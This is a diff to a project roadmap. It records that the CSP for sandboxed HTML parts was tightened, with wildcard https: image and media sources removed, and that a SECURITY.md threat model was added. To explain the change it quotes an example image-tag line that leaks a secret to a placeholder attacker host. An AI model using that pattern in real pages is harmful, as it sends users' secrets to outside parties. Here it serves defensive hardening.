@@ -398,12 +398,17 @@ deepen Workflow 2. Each is independent and opt-in to pick up; grouped by theme.
   now): a self-rendered "board status" surface — `showcase health` covers the
   need; revisit only if an in-board monitoring card is wanted. Update-check
   failures staying silent is intentional (this fork has no published release)._
-- **Tighten the html-part CSP + write down the threat model** — the sandbox
-  invariant is solid. The CDN allowlist and `connect-src` are now gone (parts run
-  inline-only with no external origins), but `img/media` still allow wide
-  `https:`/`data:`/`blob:` sources. Narrow those, add a `docs/SECURITY.md` threat
-  model, and wire the `security-review` skill into a recurring check.
-  _Effort: low–medium._
+- **✅ Shipped — Tightened the html-part CSP + wrote the threat model.** `img-src`
+  / `media-src` dropped the wildcard **`https:`** scheme (both `buildCsp` and
+  `buildRichCsp` in `surfacePage.ts`): a bare `https:` source is a URL-borne
+  exfil channel even with scripts boxed and `connect-src` closed
+  (`<img src="https://attacker/?b=<secret>">`), so images/media are now `data:` /
+  `blob:` / this board's `origin` only — no external host appears anywhere in the
+  policy. Backed by `test/surfacePage.test.ts` regression assertions (no wildcard
+  scheme in img/media). The full trust model — invariant, sandbox attribute, CSP,
+  the host bridge, auth, CSRF guard, residual risks — is now **`docs/SECURITY.md`**
+  (linked from `AGENTS.md`), which also records the maintenance rule: run the
+  `security-review` skill over any diff touching the sandbox/CSP/bridge/auth.
 
 **Extensibility ergonomics**
 
